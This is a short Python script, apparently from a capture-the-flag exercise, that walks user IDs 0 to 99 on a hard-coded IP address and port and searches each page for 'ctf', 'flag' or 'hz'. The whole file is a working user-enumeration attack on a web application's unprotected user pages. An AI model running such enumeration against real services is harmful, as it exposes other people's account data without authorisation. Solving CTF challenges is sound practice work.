import re
import requests

base = "http://139.162.5.230:10312"
pattern = re.compile(r"(?i)(hz|ctf|flag)")  # Case-insensitive search for HZ, CTF, or flag

for i in range(100):  # Assuming up to 100 users, adjust if needed
    url = f"{base}/user/{i}"
    print(f"Visiting: {url}")
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            matches = pattern.findall(r.text)
            if matches:
                print(f"Found patterns: {matches}")
                print(f"Response: {r.text[:500]}...")  # Print first 500 chars
            else:
                print("No patterns found.")
        else:
            print(f"Status code: {r.status_code}")
    except requests.RequestException as e:
        print(f"Error: {e}")
    print("-" * 50)